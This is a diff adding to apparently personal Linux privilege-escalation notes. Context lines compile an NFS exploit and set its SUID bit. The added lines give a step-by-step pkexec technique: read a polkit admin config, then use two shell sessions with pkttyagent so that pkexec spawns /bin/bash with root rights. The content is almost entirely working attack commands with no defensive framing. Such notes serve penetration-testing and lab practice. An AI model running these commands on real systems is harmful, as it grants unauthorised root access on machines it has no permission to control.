@@ -119,3 +119,12 @@ gcc nfs.c -o nfs -w
 set the SUID bit
 
 chmod +s nfs
+=====================
+if pkexec has SUID bit set and if you have creds for a local account
+checking group policy
+cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
+
+in two sessions
+S1: echo $$
+S2: pkttyagent --process <PID_FROM_S1>
+S1: pkexec "/bin/bash"
